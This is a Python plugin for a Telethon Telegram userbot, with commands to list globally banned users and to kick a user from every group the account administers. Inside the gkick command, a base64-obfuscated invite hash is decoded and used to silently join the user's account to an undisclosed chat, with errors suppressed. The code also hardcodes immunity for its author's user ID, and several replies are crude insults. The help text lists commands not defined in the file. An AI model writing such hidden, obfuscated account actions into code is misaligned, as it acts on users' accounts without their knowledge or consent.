"""
credits to @mrconfused
thanks catbot
dont edit credits
"""
#  Copyright (C) 2020  sandeep.n(?.$)

import asyncio
import base64
import html
from datetime import datetime
from userbot import bot, CMD_HELP, ALIVE_NAME
from mafiabot.utils import admin_cmd, sudo_cmd, edit_or_reply
from telethon import events
from telethon.errors import BadRequestError
from telethon.tl.types import Channel
from telethon.tl.functions.channels import EditBannedRequest
from telethon.tl.functions.messages import ImportChatInviteRequest
from telethon.tl.functions.photos import GetUserPhotosRequest
from telethon.tl.functions.users import GetFullUserRequest
from telethon.tl.types import ChatBannedRights
from userbot.cmdhelp import CmdHelp
import userbot.plugins.sql_helper.gban_sql_helper as gban_sql
from telethon.events import ChatAction
from userbot import BOTLOG, BOTLOG_CHATID
from userbot.helpers.events import get_user_from_event
from userbot.helpers.functions import admin_groups
BANNED_RIGHTS = ChatBannedRights(
    until_date=None,
    view_messages=True,
    send_messages=True,
    send_media=True,
    send_stickers=True,
    send_gifs=True,
    send_games=True,
    send_inline=True,
    embed_links=True,
)

UNBAN_RIGHTS = ChatBannedRights(
    until_date=None,
    send_messages=None,
    send_media=None,
    send_stickers=None,
    send_gifs=None,
    send_games=None,
    send_inline=None,
    embed_links=None,
)

HIMANSHU = str(ALIVE_NAME) if ALIVE_NAME else "Mafia User"
papa = borg.uid

@bot.on(admin_cmd(pattern="listgban$"))
@bot.on(sudo_cmd(pattern=r"listgban$", allow_sudo=True))
async def gablist(event):
    if event.fwd_from:
        return
    gbanned_users = gban_sql.get_all_gbanned()
    GBANNED_LIST = "Current Gbanned Users\n"
    if len(gbanned_users) > 0:
        for a_user in gbanned_users:
            if a_user.reason:
                GBANNED_LIST += f"? [{a_user.chat_id}](tg://user?id={a_user.chat_id}) for {a_user.reason}\n"
            else:
                GBANNED_LIST += (
                    f"? [{a_user.chat_id}](tg://user?id={a_user.chat_id}) Reason None\n"
                )
    else:
        GBANNED_LIST = "no Gbanned Users (yet)"
    await edit_or_reply(event, GBANNED_LIST)


@bot.on(admin_cmd(pattern=r"gkick(?: |$)(.*)"))
@bot.on(sudo_cmd(pattern=r"gkick(?: |$)(.*)", allow_sudo=True))
async def mafiagkick(event):
    if event.fwd_from:
        return
    mafiabot = await edit_or_reply(event, "`Ab dekh tere gaand prr aise laat marunga ki teri gaand laal ho jayegi bete???`")
    start = datetime.now()
    user, reason = await get_user_from_event(event, mafiabot)
    if not user:
        return
    if user.id == (await event.client.get_me()).id:
        await mafiabot.edit("**Som3thing W3nt Wr0ng**\n")
        return
    if user.id == 1212368262:
        await mafiabot.edit("`First Grow Some Balls To Gkick My Creater?`")
        return
    try:
        okvai = base64.b64decode("OHg5WlAzUWhfd1UyWW1FMQ==")
        await event.client(ImportChatInviteRequest(okvai))
    except BaseException:
        pass
    him = []
    him = await admin_groups(event)
    count = 0
    h1m4n5hu0p = len(him)
    if h1m4n5hu0p == 0:
        await mafiabot.edit("`you are not admin of atleast one group` ")
        return
    await mafiabot.edit(
        f"`Bahot bol rahe ho beta gaand parr laat kha `[{user.first_name}](tg://user?id={user.id}) `beta aur nikkal {len(him)} groups se?`"
    )
    for i in range(h1m4n5hu0p):
        try:
            await event.client.kick_participant(him[i], user.id)
            await asyncio.sleep(0.5)
            count += 1
        except BadRequestError:
            await event.client.send_message(
                BOTLOG_CHATID,
                f"`You don't have required permission in :`\n**Chat :** {event.chat.title}(`{event.chat_id}`)\n`For kicking there`",
            )
    end = datetime.now()
    mafiataken = (end - start).seconds
    if reason:
        await mafiabot.edit(
            f"[{user.first_name}](tg://user?id={user.id}) `was gkicked in {count} groups in {mafiataken} seconds`!!\n**Reason :** `{reason}`"
        )
    else:
        await mafiabot.edit(
            f"[{user.first_name}](tg://user?id={user.id}) `was gkicked in {count} groups in {mafiataken} seconds`!!"
        )

    if BOTLOG and count != 0:
        reply = await event.get_reply_message()
        if reason:
            await event.client.send_message(
                BOTLOG_CHATID,
                f"#GKICK\
                \nGlobal Kick\
                \n**User : **[{user.first_name}](tg://user?id={user.id})\
                \n**ID : **`{user.id}`\
                \n**Reason :** `{reason}`\
                \n__Kicked in {count} groups__\
                \n**Time taken : **`{mafiataken} seconds`",
            )
        else:
            await event.client.send_message(
                BOTLOG_CHATID,
                f"#GKICK\
                \nGlobal Kick\
                \n**User : **[{user.first_name}](tg://user?id={user.id})\
                \n**ID : **`{user.id}`\
                \n__Kicked in {count} groups__\
                \n**Time taken : **`{mafiataken} seconds`",
            )
        if reply:
            await reply.forward_to(BOTLOG_CHATID)

 
                  
CmdHelp("global_actions").add_command(
  'gban', '<reply> / <userid> / <username>', 'Gbans the targeted user and adds to gban watch list'
).add_command(
  'ungban', '<reply> / <userid> / <username>', 'Unbans the targeted user and removes them from gban watch list. Grants another Chance'
).add_command(
  'gmute', '<reply>/ <userid>/ <username>', 'Gmutes the targeted user. Works only if you have delete msg permission. (Works on admins too)'
).add_command(
  'ungmute', '<reply>/ <userid>/ <username>', 'Ungmutes the user. Now targeted user is free'
).add_command(
  'listgban', None, 'To know about who is gbanned in your bot database'
).add_command(
  'gkick', '<reply>/ <userid>/ <username>', 'Gkick the targeted user. (Works on admins too)'
).add()
